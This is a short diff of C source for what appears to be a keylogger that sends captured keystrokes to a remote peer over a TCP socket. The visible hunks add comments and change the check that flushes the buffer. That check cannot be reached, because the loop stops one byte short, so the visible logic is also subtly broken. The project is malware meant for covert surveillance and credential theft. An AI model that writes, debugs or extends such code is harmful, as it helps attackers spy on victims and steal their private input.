@@ -23,6 +23,8 @@ SOCKET socket_peer;
 char data[50];
 int size_data = 0;
 
+//----------------------------------------------------CODE---------------------------------------------------
+
 //creating TCP socket
 int launch_socket(){
     int getnameinfo_result = 0;
@@ -97,7 +99,8 @@ int launch_socket(){
     while(1){
         lauch_keylogger();
     }
- 
+	
+	//ending program
     CLEANUP:
         freeaddrinfo(result);
 
@@ -135,7 +138,7 @@ void add_char(const char *str){
     int str_length = strlen(str);
     
     for (int i = 0; i < str_length && size_data < sizeof(data) - 1; i++) {
-        if (size_data == 50) {
+        if (size_data == sizeof(data)) {
             send_data();
         }
 
